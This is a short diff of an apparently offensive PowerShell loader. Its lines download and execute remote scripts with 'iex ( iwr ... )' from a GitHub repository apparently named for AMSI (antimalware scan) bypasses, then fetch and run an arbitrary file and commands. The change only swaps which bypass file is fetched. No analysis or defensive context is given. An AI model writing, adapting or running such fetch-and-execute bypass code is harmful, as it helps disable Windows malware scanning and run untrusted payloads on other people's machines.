@@ -43,7 +43,7 @@ sleep 2
 iex ( iwr https://raw.githubusercontent.com/x4sh3s/AMSI_Lines/main/11.txt -UseBasicParsing)
 
 sleep 2
-iex ( iwr https://raw.githubusercontent.com/x4sh3s/AMSI_Lines/main/11.txt -UseBasicParsing )
+iex ( iwr https://raw.githubusercontent.com/x4sh3s/AMSI_Lines/main/22.txt -UseBasicParsing )
 
 sleep 2
 iex ( iwr $File -UseBasicParsing) ; iex $Commands
